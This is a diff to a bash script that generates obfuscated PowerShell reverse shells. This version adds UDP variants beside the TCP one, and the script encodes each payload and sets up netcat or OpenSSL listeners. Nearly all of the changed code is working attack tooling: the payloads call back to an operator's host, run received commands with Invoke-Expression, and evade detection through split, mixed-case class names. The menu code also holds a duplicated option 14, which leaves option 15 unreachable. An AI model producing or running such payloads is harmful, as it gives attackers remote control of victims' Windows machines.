@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-#Shells v.1.3.6
+#Shells v.1.3.7
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -395,6 +395,8 @@ listen
 }
 
 function powershell_s () {
+
+
 if [[ $2 == "core" ]]
 then 
     pw_sh="pwsh"
@@ -402,14 +404,14 @@ else
     pw_sh="powershell"
 fi
 
+#Windows?
 if [[ $3 == "w" ]]
 then 
     win="-W Hidden"
-    userinfo="(\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + (get-location)"
+    userinfo="(\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + 'PS ' + (gl)"
 else
-    userinfo="'PS ' + (get-location)"
+    userinfo="'PS ' + (gl)"
 fi
-
 
 tmp=$(openssl rand -hex 10)
 tmp2=$(openssl rand -hex 9)
@@ -421,7 +423,18 @@ sendback2=$(openssl rand -hex 10)
 sendbyte=$(openssl rand -hex 7)
 bytes=$(openssl rand -hex 5)
 i=$(openssl rand -hex 4)
-shell="\$$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$$tmp2 = [String]::Join('',\$$tmp);\$$client = New-Object \$$tmp2('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo +'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+endpoint=$(openssl rand -hex 3)
+receivebytes=$(openssl rand -hex 4)
+returndata=$(openssl rand -hex 2)
+if [[ $4 == "udp" ]]
+then
+
+    shell="\$$tmp= @('sy','STem.NeT.iP','eNd','po','inT');\$$tmp2 = [String]::Join('',\$$tmp);\$$endpoint = New-Object \$$tmp2 ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object System.Net.Sockets.UDPClient($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$result +  'PS ' + (Get-Location).Path + '> ';\$x = (Out-String);\$$sendback2 = \$$sendback + \$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+#shell="\$$tmp= @('sy','STem.NeT.iP','eNd','po','inT');\$$tmp2 = [String]::Join('',\$$tmp);\$$endpoint = New-Object \$$tmp2 ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object System.Net.Sockets.UDPClient($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '@' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$result +  'PS ' + (Get-Location).Path + '> ';\$x = (Out-String);\$$sendback2 = \$$sendback + \$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+
+else
+    shell="\$$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$$tmp2 = [String]::Join('',\$$tmp);\$$client = New-Object \$$tmp2('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
 
@@ -444,7 +457,7 @@ else
     echo -n $rev | xclip -sel c
 fi
 
-    listen
+    listen $4
 }
 
 function netcat () {
@@ -729,20 +742,20 @@ header
 printf "The following has been copied to your clipboard:\n\n"
 echo $rev
 printf "\n\n"
+if [[ $1 == "udp" ]]
+then
+    prot="-u"
+fi
  echo -ne "
+
 $(blueprint 'Listener')
-$(greenprint '1)') rlwrap netcat $1
-$(greenprint '2)') netcat $1
+$(greenprint '1)') rlwrap nc $1
+$(greenprint '2)') nc $1
 $(greenprint '3)') OpenSSL
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 Choose an option [1]:  "
-if [[ "$1" == "udp" ]]
-then
-    prot="-u"
-else
-    prot=""
-fi
+
 if [[ $usingngrok == 1 ]]
 then
     PORT=$LOCALPORT
@@ -753,17 +766,9 @@ fi
     1)
         if [[ $OS == "Darwin" ]]
         then
-            netcat=$(which netcat)
-
-            if [ "$?" == 1 ]
-            then
-                printf "\n\nRemember: The native nc on macOS, will not notify on incoming connections. Using netcat if installed. brew install netcat\n\n";    echo -e "\nListening on [any] $PORT";
-                $rlwrap -cAr $nc $prot -lvn $PORT
-            else
-                echo -e "\nListening on [any] $PORT";
-                nc=$netcat
-                $rlwrap -cAr $nc $prot -lvnp $PORT
-            fi
+            
+                printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
+                $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
         else
         printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
         fi
@@ -772,17 +777,8 @@ fi
     2)
         if [[ $OS == "Darwin" ]]
         then
-            netcat=$(which netcat)
-
-            if [ "$?" == 1 ]
-            then
-                printf "\n\nRemember: The native nc on macOS, will not notify on incoming connections. Using netcat if installed. brew install netcat\n\n";    echo -e "\nListening on [any] $PORT";
-                $nc $prot -lvn $PORT
-            else
-                echo -e "\nListening on [any] $PORT";
-                nc=$netcat
-                $nc $prot -lvnp $PORT
-            fi
+                printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
+                $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
         else
         printf "\n\n";$nc $prot -lvnp $PORT
         fi
@@ -792,6 +788,7 @@ fi
         echo
         echo "Listening on port: $PORT"
         openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port "$PORT"
+        
         ;;
    
     m)
@@ -801,20 +798,11 @@ fi
     0)
         fn_bye
         ;;
-    *)
+    "")
         if [[ $OS == "Darwin" ]]
         then
-            netcat=$(which netcat)
-
-            if [ "$?" == 1 ]
-            then
-                printf "\n\nRemember: The native nc on macOS, will not notify on incoming connections. Using netcat if installed. brew install netcat\n\n";    echo -e "\nListening on [any] $PORT";
-                $rlwrap -cAr $nc $prot -lvn $PORT
-            else
-                echo -e "\nListening on [any] $PORT";
-                nc=$netcat
-                $rlwrap -cAr $nc $prot -lvnp $PORT
-            fi
+            printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
+            $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
         else
         printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
         fi
@@ -866,20 +854,29 @@ submenu_powershell() {
 header
     echo -ne "
 $(blueprint 'Powershell')
-$(greenprint '1)') Powershell - Windows 
-$(greenprint '2)') Powershell - Windows URL encoded
-$(greenprint '3)') Powershell - Windows Double URL encoded
-$(greenprint '4)') Powershell - Windows Core
-$(greenprint '5)') Powershell - Windows Core URL encoded
-$(greenprint '6)') Powershell - Windows Core Double URL encoded
-$(greenprint '7)') Powershell - Core
-$(greenprint '8)') Powershell - Core URL encoded
-$(greenprint '9)') Powershell - Core Double URL encoded
+$(greenprint '1)') Powershell TCP - Windows 
+$(greenprint '2)') Powershell TCP - Windows URL encoded
+$(greenprint '3)') Powershell TCP - Windows Double URL encoded
+$(greenprint '4)') Powershell TCP - Windows Core
+$(greenprint '5)') Powershell TCP - Windows Core URL encoded
+$(greenprint '6)') Powershell TCP - Windows Core Double URL encoded
+$(greenprint '7)') Powershell TCP - Core
+$(greenprint '8)') Powershell TCP - Core URL encoded
+$(greenprint '9)') Powershell TCP - Core Double URL encoded
+$(greenprint '10)') Powershell UDP - Windows 
+$(greenprint '11)') Powershell UDP - Windows URL encoded
+$(greenprint '12)') Powershell UDP - Windows Double URL encoded
+$(greenprint '13)') Powershell UDP - Windows Core
+$(greenprint '14)') Powershell UDP - Windows Core URL encoded
+$(greenprint '15)') Powershell UDP - Windows Core Double URL encoded
+$(greenprint '16)') Powershell UDP - Core
+$(greenprint '17)') Powershell UDP - Core URL encoded
+$(greenprint '18)') Powershell UDP - Core Double URL encoded
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
-    read -r -n 1 ans
+    read -r -n 2 ans
     case $ans in
     1)
         powershell_s "" "" "w"
@@ -907,6 +904,33 @@ Choose an option:  "
         ;;
     9)
         powershell_s "urlx2" "core"
+        ;;
+    10)
+        powershell_s "" "" "w" "udp"
+        ;;
+    11)
+        powershell_s "url" "" "w" "udp"
+        ;;
+    12)
+        powershell_s "urlx2" "" "w" "udp"
+        ;;
+    13)
+        powershell_s "" "core" "w" "udp"
+        ;;
+    14)
+        powershell_s "url" "core" "w" "udp"
+        ;;
+    14)
+        powershell_s "urlx2" "core" "w" "udp"
+        ;;
+    16)
+        powershell_s "" "core" "" "udp"
+        ;;
+    17)
+        powershell_s "url" "core" "" "udp"
+        ;;
+    18)
+        powershell_s "urlx2" "core" "" "udp"
         ;;
     m)
         mainmenu
